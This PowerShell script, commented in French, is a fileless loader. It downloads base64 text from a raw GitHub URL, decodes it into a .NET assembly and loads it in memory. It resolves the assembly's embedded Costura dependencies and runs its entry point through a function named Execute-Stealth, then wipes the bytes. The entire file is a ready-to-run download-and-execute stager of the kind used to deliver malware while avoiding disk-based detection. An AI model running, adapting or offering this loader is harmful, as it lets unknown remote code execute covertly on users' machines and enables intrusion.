[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Download-Base64 {
    param (
        [string]$url
    )
    $base64 = Invoke-RestMethod -Uri $url
    return $base64
}

function Decode-Base64 {
    param (
        [string]$base64
    )
    $bytes = [Convert]::FromBase64String($base64)
    return $bytes
}

function Execute-InMemory {
    param (
        [byte[]]$bytes
    )

    # Variable script pour que le handler y accede (closures peuvent avoir des problemes)
    $script:mainAssemblyForResolve = $null
    
    # Handler pour resoudre les dependances emballees (Costura.Fody)
    $onAssemblyResolve = {
        param($sender, $e)
        $assemblyName = $e.Name.Split(',')[0].ToLowerInvariant()
        
        # Chercher dans les ressources de l'assembly principal charge
        if ($script:mainAssemblyForResolve -ne $null) {
            $resourceNames = $script:mainAssemblyForResolve.GetManifestResourceNames()
            
            # Format Costura: costura.{assemblyname}.dll.compressed ou costura.{assemblyname}.dll
            $searchPatterns = @(
                "costura.$assemblyName.dll.compressed",
                "costura.$assemblyName.dll",
                "costura.$($assemblyName.Replace('.', '_'))*.dll.compressed",
                "costura.$($assemblyName.Replace('.', '_'))*.dll"
            )
            
            # Recherche directe dans toutes les ressources Costura
            foreach ($resourceName in $resourceNames) {
                if ($resourceName -like "costura.*") {
                    # Extraire le nom de l'assembly depuis la ressource
                    $resourceBase = $resourceName -replace '^costura\.', '' -replace '\.dll(\.compressed)?$', ''
                    $resourceBaseNormalized = $resourceBase -replace '_', '.'
                    
                    if ($resourceBaseNormalized -eq $assemblyName -or $resourceBase -eq $assemblyName) {
                        try {
                            $stream = $script:mainAssemblyForResolve.GetManifestResourceStream($resourceName)
                            if ($stream -ne $null) {
                                $assemblyBytes = $null
                                
                                # Si c'est compressé, decompresser avec DeflateStream
                                if ($resourceName.EndsWith(".compressed")) {
                                    $deflateStream = New-Object System.IO.Compression.DeflateStream($stream, [System.IO.Compression.CompressionMode]::Decompress)
                                    $memoryStream = New-Object System.IO.MemoryStream
                                    $deflateStream.CopyTo($memoryStream)
                                    $assemblyBytes = $memoryStream.ToArray()
                                    $deflateStream.Close()
                                    $memoryStream.Close()
                                }
                                else {
                                    $assemblyBytes = New-Object byte[] $stream.Length
                                    $stream.Read($assemblyBytes, 0, $assemblyBytes.Length) | Out-Null
                                }
                                
                                $stream.Close()
                                return [System.Reflection.Assembly]::Load($assemblyBytes)
                            }
                        }
                        catch {
                            # Ignorer les erreurs de lecture
                        }
                    }
                }
            }
            
            # Fallback: recherche par pattern
            foreach ($pattern in $searchPatterns) {
                $resourceName = $resourceNames | Where-Object { $_ -like $pattern }
                
                if ($resourceName) {
                    try {
                        $stream = $script:mainAssemblyForResolve.GetManifestResourceStream($resourceName)
                        if ($stream -ne $null) {
                            $assemblyBytes = $null
                            
                            # Si c'est compressé, decompresser avec DeflateStream
                            if ($resourceName.EndsWith(".compressed")) {
                                $deflateStream = New-Object System.IO.Compression.DeflateStream($stream, [System.IO.Compression.CompressionMode]::Decompress)
                                $memoryStream = New-Object System.IO.MemoryStream
                                $deflateStream.CopyTo($memoryStream)
                                $assemblyBytes = $memoryStream.ToArray()
                                $deflateStream.Close()
                                $memoryStream.Close()
                            }
                            else {
                                $assemblyBytes = New-Object byte[] $stream.Length
                                $stream.Read($assemblyBytes, 0, $assemblyBytes.Length) | Out-Null
                            }
                            
                            $stream.Close()
                            return [System.Reflection.Assembly]::Load($assemblyBytes)
                        }
                    }
                    catch {
                        # Ignorer les erreurs de lecture
                    }
                }
            }
        }
        return $null
    }
    [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)

    $script:mainAssemblyForResolve = [System.Reflection.Assembly]::Load($bytes)

    $entryPoint = $script:mainAssemblyForResolve.EntryPoint
    if ($entryPoint -ne $null) {
        $entryPoint.Invoke($null, @())
    }
}

function Execute-Stealth {
    param (
        [string]$url
    )

    $base64 = Download-Base64 -url $url
    $bytes = Decode-Base64 -base64 $base64
    Execute-InMemory -bytes $bytes

    [Array]::Clear($bytes, 0, $bytes.Length)
}

$url = "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/file.txt"

Execute-Stealth -url $url
